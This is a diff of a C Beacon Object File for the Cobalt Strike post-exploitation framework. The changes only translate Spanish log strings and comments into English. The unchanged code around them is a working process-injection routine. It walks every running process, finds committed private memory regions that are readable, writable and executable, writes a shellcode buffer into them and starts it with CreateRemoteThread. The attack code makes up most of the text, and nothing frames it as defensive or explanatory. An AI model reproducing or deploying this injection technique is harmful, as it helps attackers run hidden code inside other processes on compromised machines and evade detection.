@@ -22,7 +22,7 @@
 #include <tlhelp32.h>
 #include "beacon.h"
 
-// Símbolos
+// Symbols
 extern PVOID __imp_LoadLibraryA;
 extern PVOID __imp_GetProcAddress;
 extern PVOID __imp_CreateToolhelp32Snapshot;
@@ -83,11 +83,11 @@ typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE
 typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
 void go(char *args, int alen) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Iniciando búsqueda de regiones RWX en procesos...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting search for RWX regions in processes...\n");
 
     HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
     if (!hKernel32) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo cargar kernel32.dll\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not load kernel32.dll\n");
         return;
     }
 
@@ -96,7 +96,7 @@ void go(char *args, int alen) {
     pCreateRemoteThread pCreateRemoteThreadFn = (pCreateRemoteThread)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateRemoteThread");
 
     if (!pVirtualQueryExFn || !pWriteProcessMemoryFn || !pCreateRemoteThreadFn) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudieron resolver VirtualQueryEx, WriteProcessMemory o CreateRemoteThread\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not resolve VirtualQueryEx, WriteProcessMemory or CreateRemoteThread\n");
         return;
     }
 
@@ -108,7 +108,7 @@ void go(char *args, int alen) {
 
     HANDLE snapshot = pCreateToolhelp32SnapshotFn(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Error creando snapshot de procesos\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error creating process snapshot\n");
         return;
     }
 
@@ -116,7 +116,7 @@ void go(char *args, int alen) {
     processEntry.dwSize = sizeof(PROCESSENTRY32);
 
     if (!pProcess32FirstFn(snapshot, &processEntry)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Process32First falló\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Process32First failed\n");
         pCloseHandleFn(snapshot);
         return;
     }
@@ -124,7 +124,7 @@ void go(char *args, int alen) {
     do {
         HANDLE process = pOpenProcessFn(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
         if (process) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Proceso: %S (PID: %d)\n", processEntry.szExeFile, processEntry.th32ProcessID);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Process: %S (PID: %d)\n", processEntry.szExeFile, processEntry.th32ProcessID);
 
             MEMORY_BASIC_INFORMATION mbi = {0};
             LPVOID offset = 0;
@@ -136,21 +136,21 @@ void go(char *args, int alen) {
                     mbi.State == MEM_COMMIT &&
                     mbi.Type == MEM_PRIVATE) {
 
-                    BeaconPrintf(CALLBACK_OUTPUT, "\t[!] ¡Región RWX encontrada! 0x%p\n", mbi.BaseAddress);
+                    BeaconPrintf(CALLBACK_OUTPUT, "\t[!] RWX region found! 0x%p\n", mbi.BaseAddress);
 
                     SIZE_T bytesWritten = 0;
                     if (pWriteProcessMemoryFn(process, mbi.BaseAddress, shellcode, sizeof(shellcode) - 1, &bytesWritten)) {
-                        BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Shellcode escrito (%zu bytes)\n", bytesWritten);
+                        BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Shellcode written (%zu bytes)\n", bytesWritten);
 
                         HANDLE hThread = pCreateRemoteThreadFn(process, NULL, 0, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, 0, NULL);
                         if (hThread) {
-                            BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Hilo remoto creado. ¡Shellcode en ejecución!\n");
+                            BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Remote thread created. Shellcode running!\n");
                             pCloseHandleFn(hThread);
                         } else {
-                            BeaconPrintf(CALLBACK_ERROR, "\t[-] Error creando hilo remoto. GetLastError: %d\n", GetLastError());
+                            BeaconPrintf(CALLBACK_ERROR, "\t[-] Error creating remote thread. GetLastError: %d\n", GetLastError());
                         }
                     } else {
-                        BeaconPrintf(CALLBACK_ERROR, "\t[-] Error escribiendo shellcode. GetLastError: %d\n", GetLastError());
+                        BeaconPrintf(CALLBACK_ERROR, "\t[-] Error writing shellcode. GetLastError: %d\n", GetLastError());
                     }
                 }
             }
@@ -160,5 +160,5 @@ void go(char *args, int alen) {
     } while (pProcess32NextFn(snapshot, &processEntry));
 
     pCloseHandleFn(snapshot);
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Escaneo completado.\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scan completed.\n");
 }
